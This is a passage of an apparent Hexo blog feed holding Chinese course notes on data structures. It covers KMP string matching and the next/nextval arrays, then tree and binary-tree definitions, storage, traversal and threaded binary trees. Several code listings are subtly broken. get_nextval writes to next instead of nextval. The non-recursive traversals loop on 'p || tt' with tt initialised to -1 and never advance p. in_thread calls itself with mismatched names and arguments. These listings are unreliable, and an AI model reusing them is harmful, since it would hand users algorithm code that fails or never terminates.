<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-1-2-算法演示"><a href="#2-1-2-算法演示" class="headerlink" title="2.1.2 算法演示"></a>2.1.2 算法演示</h3><p><img src="https://pic2.zhimg.com/80/v2-7f0ced6c05f25a0ddc48627012450fbd_1440w.webp"></p><h3 id="2-1-3-性能分析"><a href="#2-1-3-性能分析" class="headerlink" title="2.1.3 性能分析"></a>2.1.3 性能分析</h3><ul><li><strong>最好时间复杂度</strong>：O(T.size() + S.size())</li><li><strong>最坏时间复杂度</strong>：O(T.size() * S.size())</li></ul><h2 id="2-2-KMP算法"><a href="#2-2-KMP算法" class="headerlink" title="2.2 KMP算法"></a>2.2 KMP算法</h2><p>KMP算法的改进在于：每一趟匹配过程中出现字符比较不等时，不需要回朔指针 i ，要利用已经“部分匹配”结果，调整指针 j ，即将模式向右滑动尽可能远的一段距离，来提高算法效率。</p><p>KMP算法匹配过程示意如下：</p><p><img src="https://pic2.zhimg.com/80/v2-e6f52632d9776ca67233d0b81504c425_1440w.webp"></p><blockquote><p>前缀表是用来回退的，它记录了模式串与主串(文本串)不匹配的时候，模式串应该从哪里开始重新匹配。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/019dd939a65e4fac653612f84f942e2c.png"></p><p>从上面的流程可以看到，在子串的某一个字符 t[j] 处匹配失败时，我们需要查找该字符前面的那个子串的最大相等前后缀的长度，即 next[j-1] ，然后使 j 指针退回到 next[j-1] ，i 指针不变，继续匹配，不断重复这个操作知道匹配成功或者 j 指针大于等于子串长度。</p><p>在这里j指针之所以退回到 next[j-1] 的位置我们可以根据例子思考一下，字符”f”前面的子串为”aabaa”，该子串的最大相等前后缀为”aa”，而该子串的后缀”aa”已经与 s[3]s[4] 比较过是相等的，那么子串的前缀就一定是与 s[3]s[4] 相等的，不需要比较，因此我们的 j 可以从前缀的后面第一个字符开始匹配，而前缀的长度为 next[j-1]，所以j应该回退到 next[j-1]。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ne[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_next</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>, j = <span class="number">0</span>; i &lt;= n; i ++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (j &amp;&amp; p[i] != p[j + <span class="number">1</span>]) j = ne[j];</span><br><span class="line"><span class="keyword">if</span> (p[i] == p[j + <span class="number">1</span>]) j ++;</span><br><span class="line">ne[i] = j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">kmp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>; i &lt;= m; i ++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (j &amp;&amp; s[i] != p[j + <span class="number">1</span>]) j = ne[j];</span><br><span class="line"><span class="keyword">if</span> (s[i] == p[j + <span class="number">1</span>]) j ++;</span><br><span class="line"><span class="keyword">if</span> (j == n)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; i - n &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">j = ne[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-1-性能分析"><a href="#2-2-1-性能分析" class="headerlink" title="2.2.1 性能分析"></a>2.2.1 性能分析</h3><ul><li>KMP算法的时间复杂度是O(n + m)，主串始终没有回退</li><li>但在一般的情况下，普通模式匹配的实际执行时间近似为O(n + m)，因此至今仍然被采用</li><li>KMP算法尽在主串与子串有很多“部分匹配”时才显得比普通算法快得多，主要优点是主串不回溯</li></ul><h2 id="2-3-KMP算法的进一步优化"><a href="#2-3-KMP算法的进一步优化" class="headerlink" title="2.3 KMP算法的进一步优化"></a>2.3 KMP算法的进一步优化</h2><p>在进行匹配时，当 $p_{j} ≠ s_{j}$时，下次匹配必然是 $p_{next[j]}$ 和 $s_{j}$ 进行比较，如果$p_{next[j]} &#x3D; p_{j}$，那么就相当于拿了一个和 $p_{j}$ 相等的字符和 $s_{j}$ 继续比较，这必然导致继续失配。</p><p>如果出现了，则需要再次递归，将 next[j] 修正为 next[next[j]] ，直至两者不相等为止，更新后的数组命名为 nextval ，计算 next 数组修正如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_nextval</span><span class="params">(SString &amp;T, <span class="type">int</span> &amp;nextval[])</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">i = <span class="number">1</span>; nextval[<span class="number">1</span>] = <span class="number">0</span>; j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (i &lt; T[<span class="number">0</span>]) &#123;</span><br><span class="line"><span class="keyword">if</span> (j == <span class="number">0</span> || T[i] == T[j])</span><br><span class="line">&#123;</span><br><span class="line">++i; ++j;</span><br><span class="line"><span class="keyword">if</span> (T[i] != T[j]) next[i] = j;</span><br><span class="line"><span class="keyword">else</span> nextval[i] = nextval[j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> j = nextval[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="comment">// get_nextval</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构第5章：树与二叉树</title>
      <link href="/2024/06/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E6%A0%91%E4%B8%8E%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
      <url>/2024/06/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E6%A0%91%E4%B8%8E%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="1-树的定义和基本概念"><a href="#1-树的定义和基本概念" class="headerlink" title="1 树的定义和基本概念"></a>1 树的定义和基本概念</h1><p>树型结构是一类重要的非线性结构。树型结构是结点之间有分支，并且具有层次关系的结构，它非常类似于自然界中的树。树结构在客观世界国是大量存在的，例如家谱、行政组织机构都可用树形象地表示。</p><p>树在计算机领域中也有着广泛的应用，例如在编译程序中，用树来表示源程序的语法结构；在数据库系统中，可用树来组织信息；在分析算法的行为时，可用树来描述其执行过程，等等。  </p><h2 id="1-1-树的定义"><a href="#1-1-树的定义" class="headerlink" title="1.1 树的定义"></a>1.1 树的定义</h2><p><strong>定义</strong>：树(tree)是n(n&gt;0)个结点的有限集T，其中：有且仅有一个特定的结点，称为树的根（root）。</p><p>当$n&gt;1$时，其余结点可分为$m(m&gt;0)$个互不相交的有限集T1,T2,……Tm，其中每一个集合本身又是一棵树，称为根的子树（subtree）。</p><p><strong>特点</strong>：</p><ol><li>树中至少有一个结点——根</li><li>树中各子树是互不相交的集合</li></ol><p><img src="/2024/06/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E6%A0%91%E4%B8%8E%E4%BA%8C%E5%8F%89%E6%A0%91/image-20240610074550985.png"></p><h2 id="1-2-基本概念"><a href="#1-2-基本概念" class="headerlink" title="1.2 基本概念"></a>1.2 基本概念</h2><ul><li><strong>结点</strong>(node)——指树中的一个数据元素，包括数据项及若干指向其子树的分支。一般用一个字母表示。</li><li><strong>结点的度</strong>(degree)——结点拥有的子树数</li><li><strong>叶子</strong>(leaf)——度为0的结点，也叫终端结点。 </li><li><strong>分支结点</strong>——除叶子结点外的所有结点，也k叫非终端结点。</li><li><strong>孩子</strong>(child)——结点子树的根称为该结点的孩子</li><li><strong>双亲</strong>(parents)——孩子结点的上层结点叫该结点的双亲</li><li><strong>祖先结点</strong>——从根结点到该结点所经过分枝上的所有结点为该结点的祖先。</li><li><strong>子孙结点</strong>——某一结点的子女及子女的子女都为该结点子孙。</li><li><strong>兄弟</strong>(sibling)——具有同一个双亲的结点</li><li><strong>树的度</strong>——一棵树中最大的结点度数</li><li><strong>结点的层次</strong>(level)——从根结点算起，根为第一层，它的孩子为第二层……</li><li><strong>深度</strong>(depth)——树中结点的最大层次数</li><li><strong>有序树</strong>——若一棵树中所有子树从左到右的排序是有顺序的，不能颠倒次序。称该树为有序树。</li><li><strong>无序树</strong>——若一棵树中所有子树的次序无关紧要，则称为无序树。</li><li><strong>森林</strong>(forest)——m(m≠0)棵互不相交的树的集合.一棵树可以看成是一个特殊的森林。</li></ul><p><img src="/2024/06/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E6%A0%91%E4%B8%8E%E4%BA%8C%E5%8F%89%E6%A0%91/image-20240610074928787.png"></p><h2 id="1-3-树的其它表示方式"><a href="#1-3-树的其它表示方式" class="headerlink" title="1.3 树的其它表示方式"></a>1.3 树的其它表示方式</h2><p><img src="/2024/06/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E6%A0%91%E4%B8%8E%E4%BA%8C%E5%8F%89%E6%A0%91/image-20240610075031545.png"></p><h2 id="1-4-树的性质"><a href="#1-4-树的性质" class="headerlink" title="1.4 树的性质"></a>1.4 树的性质</h2><p>树具有如下最基本的性质：</p><ol><li>树中的结点数等于所有节点的度数加1。</li><li>度为m的树中第 i 层上至多有$ m^{i-1} $ 个结点。</li><li>高度为h的m叉树至多有$(m^{h}-1)&#x2F;(m-1)$个结点。</li><li>具有n个结点的m叉树的最小高度为$logm(n(m-1)+1)$向上取整。</li></ol><hr><h1 id="2-二叉树的概念"><a href="#2-二叉树的概念" class="headerlink" title="2 二叉树的概念"></a>2 二叉树的概念</h1><h2 id="2-1-二叉树的存储结构"><a href="#2-1-二叉树的存储结构" class="headerlink" title="2.1 二叉树的存储结构"></a>2.1 二叉树的存储结构</h2><h3 id="2-1-1-顺序存储"><a href="#2-1-1-顺序存储" class="headerlink" title="2.1.1 顺序存储"></a>2.1.1 顺序存储</h3><p>二叉树的顺序存储结构就是用<strong>一维数组</strong>存储二叉树中的结点，并且结点的存储位置，也就是数组的下标要能体现结点之间的逻辑关系，比如双亲与孩子之间的关系，左右兄弟之间的关系等。</p><p>当然对于一般的二叉树，尽管层序编号不能反映逻辑关系，但是可以将其按完全二叉树编号，只不过，把存在的结点设置为“^”而已。如图中，注意浅色结点表示不存在。</p><p><img src="https://img-blog.csdnimg.cn/20200620132130300.png#pic_center"></p><p><strong>特点：</strong></p><ul><li>结点间关系蕴含在其存储位置中</li><li>浪费空间，适于存满二叉树和完全二叉树</li></ul><h3 id="2-1-2-链式存储"><a href="#2-1-2-链式存储" class="headerlink" title="2.1.2 链式存储"></a>2.1.2 链式存储</h3><p>二叉树每个结点最多有两个孩子，所以为他设计一个数据域和两个指针域是比较自然的想法，我们称这样的链表叫做二叉链表。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 二叉树的二叉链表结点结构定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">BiNode</span></span><br><span class="line">&#123;</span><br><span class="line">TElemType data;                  <span class="comment">// 结点数据</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">BiTNode</span> *lchild,*rchild;  <span class="comment">// 左右孩子指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200620133242906.png#pic_center"></p><p>另外还有一种三叉链表，定义如下所示。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;   </span><br><span class="line">Elemtype data;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> *lchild, *rchild, *parent;  <span class="comment">// parent指针指向父结点</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><h2 id="2-2-二叉树的遍历"><a href="#2-2-二叉树的遍历" class="headerlink" title="2.2 二叉树的遍历"></a>2.2 二叉树的遍历</h2><h3 id="2-2-1-二叉树的递归遍历"><a href="#2-2-1-二叉树的递归遍历" class="headerlink" title="2.2.1 二叉树的递归遍历"></a>2.2.1 二叉树的递归遍历</h3><p><strong>遍历</strong>：按一定规律走遍树的各个顶点，且使每一顶点仅被访问一次，即找一个完整而有规律的走法，以得到树中所有结点的一个线性排列。</p><p>二叉树的遍历可以分解为：访问根，遍历左子树和遍历右子树。</p><h4 id="2-2-1-1-先序遍历"><a href="#2-2-1-1-先序遍历" class="headerlink" title="2.2.1.1 先序遍历"></a>2.2.1.1 先序遍历</h4><p>根节点→左子树→右子树</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">pre_order</span><span class="params">(BiTree T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (T != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">visit</span>(T);</span><br><span class="line"><span class="built_in">pre_order</span>(T.lchild);</span><br><span class="line"><span class="built_in">pre_order</span>(T.rchild);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://developer.qcloudimg.com/http-save/yehe-admin/476cc2797c949cbad013db8f940786b7.png"></p><h4 id="2-2-1-2-中序遍历"><a href="#2-2-1-2-中序遍历" class="headerlink" title="2.2.1.2 中序遍历"></a>2.2.1.2 中序遍历</h4><p>左子树→根节点→右子树</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">in_order</span><span class="params">(BiTree T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (T != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">in_order</span>(T.lchild);</span><br><span class="line"><span class="built_in">visit</span>(T);</span><br><span class="line"><span class="built_in">in_order</span>(T.rchild);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://developer.qcloudimg.com/http-save/yehe-admin/4e72e965f0533784674e654a1c7dab63.png"></p><h4 id="2-2-1-3-后序遍历"><a href="#2-2-1-3-后序遍历" class="headerlink" title="2.2.1.3 后序遍历"></a>2.2.1.3 后序遍历</h4><p>左子树→右子树→根节点</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">post_order</span><span class="params">(BiTree T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (T != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">post_order</span>(T.lchild);</span><br><span class="line"><span class="built_in">post_order</span>(T.rchild);</span><br><span class="line"><span class="built_in">visit</span>(T);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://developer.qcloudimg.com/http-save/yehe-admin/23657993645fa486e5cb3c656c11128f.png"></p><h4 id="2-2-1-4-性能分析"><a href="#2-2-1-4-性能分析" class="headerlink" title="2.2.1.4 性能分析"></a>2.2.1.4 性能分析</h4><ul><li><strong>时间复杂度</strong>：上述三种遍历方式，只是访问根节点的顺序不同，不管采用哪种遍历方法，每个结点都只访问一次，所以时间复杂度均为$O(n)$</li><li><strong>空间复杂度</strong>：递归遍历中，栈深刚好是树的深度，所以最坏情况下，空间复杂度为$O(n)$</li></ul><h3 id="2-2-2-二叉树的非递归遍历"><a href="#2-2-2-二叉树的非递归遍历" class="headerlink" title="2.2.2 二叉树的非递归遍历"></a>2.2.2 二叉树的非递归遍历</h3><p>树的递归过程本质上实对栈的操作过程，因此可以直接通过对栈的读操作，来把递归算法写为非递归算法。</p><h4 id="2-2-2-1-先序遍历"><a href="#2-2-2-1-先序遍历" class="headerlink" title="2.2.2.1 先序遍历"></a>2.2.2.1 先序遍历</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> stk[N], tt = <span class="number">-1</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">in_order</span><span class="params">(BiTree T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">auto</span> p = T;</span><br><span class="line"><span class="keyword">while</span> (p || tt)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (p)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">visit</span>(p);</span><br><span class="line">stk[++ tt] = p;</span><br><span class="line"><span class="comment">// 一路走向最左儿子</span></span><br><span class="line">p = p.lchild;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> t = stk[tt --];</span><br><span class="line">t = t.rchild;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-2-2-中序遍历"><a href="#2-2-2-2-中序遍历" class="headerlink" title="2.2.2.2 中序遍历"></a>2.2.2.2 中序遍历</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> stk[N], tt = <span class="number">-1</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">in_order</span><span class="params">(BiTree T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">auto</span> p = T;</span><br><span class="line"><span class="keyword">while</span> (p || tt)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (p)</span><br><span class="line">&#123;</span><br><span class="line">stk[++ tt] = p;</span><br><span class="line"><span class="comment">// 一路走向最左儿子</span></span><br><span class="line">p = p.lchild;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> t = stk[tt --];</span><br><span class="line"><span class="built_in">visit</span>(t);</span><br><span class="line">t = t.rchild;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-3-二叉树的层次遍历"><a href="#2-2-3-二叉树的层次遍历" class="headerlink" title="2.2.3 二叉树的层次遍历"></a>2.2.3 二叉树的层次遍历</h3><p><strong>层次遍历</strong>：从上到下、从左到右访问各结点。</p><p><img src="https://img-blog.csdnimg.cn/5461810bfdb441ba87d2c78bc3f3e252.png"></p><p>进行层次遍历，需要借助一个队列：</p><ul><li>先将二叉树根节点入队，然后出队，访问出队结点</li><li>左子树入队</li><li>右子树入队</li></ul><h4 id="2-2-3-1-代码实现"><a href="#2-2-3-1-代码实现" class="headerlink" title="2.2.3.1 代码实现"></a>2.2.3.1 代码实现</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> q[N], hh, tt = <span class="number">-1</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">level_order</span><span class="params">(BiTree T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">q[++ tt] = T;</span><br><span class="line"><span class="keyword">while</span> (hh &lt;= tt)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> t = q[hh ++];</span><br><span class="line"><span class="built_in">visit</span>(t);</span><br><span class="line"><span class="keyword">if</span> (t.lchild != <span class="literal">nullptr</span>) q[++ tt] = t.lchild;</span><br><span class="line"><span class="keyword">if</span> (t.rchild != <span class="literal">nullptr</span>) q[++ tt] = t.rchild;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-3-线索二叉树"><a href="#2-3-线索二叉树" class="headerlink" title="2.3 线索二叉树"></a>2.3 线索二叉树</h2><h3 id="2-3-1-基础概念"><a href="#2-3-1-基础概念" class="headerlink" title="2.3.1 基础概念"></a>2.3.1 基础概念</h3><p>传统的二叉树中仅能体现一种父子关系，不能得到结点在遍历中的前驱或后继。在有$n$个结点的二叉链表中必定有$n+1$个空链域，能否利用这些空指针域来存储其前驱或后继的指针？</p><p><strong>线索</strong>：指向前驱或后继结点的指针<br><strong>线索二叉树</strong>：加上线索的二叉链表表示的二叉树，可以加快查找结点前驱和后继的速度<br><strong>线索化</strong>：对二叉树按某种遍历次序使其变为线索二叉树的过程</p><p><strong>二叉树的二叉线索存储表示</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Link==0:指针,Thread==1:线索</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123;Link, Thread&#125; PointerTag;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">BiThrNode</span></span><br><span class="line">&#123;</span><br><span class="line">    TElemType data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">BiThtNode</span> *lchild, *rchild;                            </span><br><span class="line">    PointerTag LTag, Rtag;</span><br><span class="line">&#125;BiTreeNode, *BiThrTree;  </span><br></pre></td></tr></table></figure><h3 id="2-3-2-中序线索二叉树的构造"><a href="#2-3-2-中序线索二叉树的构造" class="headerlink" title="2.3.2 中序线索二叉树的构造"></a>2.3.2 中序线索二叉树的构造</h3><p>对普通二叉树以某种次序遍历使其成为线索二叉树的过程就叫做线索化。因为前驱和后继结点只有在二叉树的遍历过程中才能得到，所以线索化的具体过程就是在二叉树的遍历中修改空指针。</p><p>线索二叉树分为前序线索二叉树、中序线索二叉树和后序线索二叉树。</p><h4 id="2-3-2-1-算法思想"><a href="#2-3-2-1-算法思想" class="headerlink" title="2.3.2.1 算法思想"></a>2.3.2.1 算法思想</h4><ol><li>指针 p 指向根节点，pre 初始化为空，pre 永远指向 p 的前驱。</li><li>若 p 非空，则重复以下操作：<ul><li>中序遍历线索化 p 的左子树。（递归）</li><li>若 p 的左子树为空，则给 p 加上左线索，即 p.ltag &#x3D; true，p 的左子树指针指向 pre(前驱)，即 p.lchild &#x3D; pre；否则令 p.ltag &#x3D; false。</li><li>若 pre非空，则判断如果 pre 的右子树为空，给 pre 加上右线索，即 pre.rtag &#x3D; true，pre 的右孩子指针指向 p (后继)，即 pre.rchild &#x3D; p；否则令 pre.rtag &#x3D; false。</li><li>p 赋值给 pre，p 转向 p 的右子树。</li><li>中序遍历线索化 p 的右子树。（递归）</li></ul></li><li>处理最后一个节点，令其后继为空，即 pre.rchild &#x3D; NULL；pre.rtag &#x3D; true。</li></ol><h4 id="2-3-2-2-算法过程"><a href="#2-3-2-2-算法过程" class="headerlink" title="2.3.2.2 算法过程"></a>2.3.2.2 算法过程</h4><p><img src="https://img-blog.csdnimg.cn/dea7570fc7334e52955c5e2f8f9e93d4.gif"></p><h4 id="2-3-2-3-代码实现"><a href="#2-3-2-3-代码实现" class="headerlink" title="2.3.2.3 代码实现"></a>2.3.2.3 代码实现</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">in_thread</span><span class="params">(ThreadTree&amp; p, ThreadTree&amp; pre)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (p) </span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 递归 线索化左子树</span></span><br><span class="line"><span class="built_in">in_thread</span>(p-&gt;lchild);</span><br><span class="line"><span class="keyword">if</span> (p-&gt;lchild == <span class="literal">NULL</span>) </span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 建立前驱线索</span></span><br><span class="line">    p-&gt;ltag = <span class="literal">true</span>;</span><br><span class="line">    p-&gt;lchild = pre;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> p-&gt;ltag = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pre != <span class="literal">NULL</span> &amp;&amp; pre-&gt;rchild == <span class="literal">NULL</span>) </span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 建立前驱结点的后继线索</span></span><br><span class="line">pre-&gt;rtag = <span class="literal">true</span>;</span><br><span class="line">pre-&gt;rchild = p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 标记当前结点为刚刚访问过的结点</span></span><br><span class="line">pre = p;</span><br><span class="line"><span class="comment">// 递归 线索化右子树</span></span><br><span class="line"><span class="built_in">InThread</span>(p-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateInThread</span><span class="params">(Btree &amp;T)</span> </span>&#123;</span><br><span class="line">    pre = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="comment">// 非空二叉树 线索化</span></span><br><span class="line">    <span class="keyword">if</span> (T) </span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">InThread</span>(T, pre);</span><br><span class="line"><span class="comment">// 处理遍历的最后一个结点</span></span><br><span class="line">        pre-&gt;rtag = <span class="literal">true</span>;</span><br><span class="line">        pre-&gt;rchild = <span 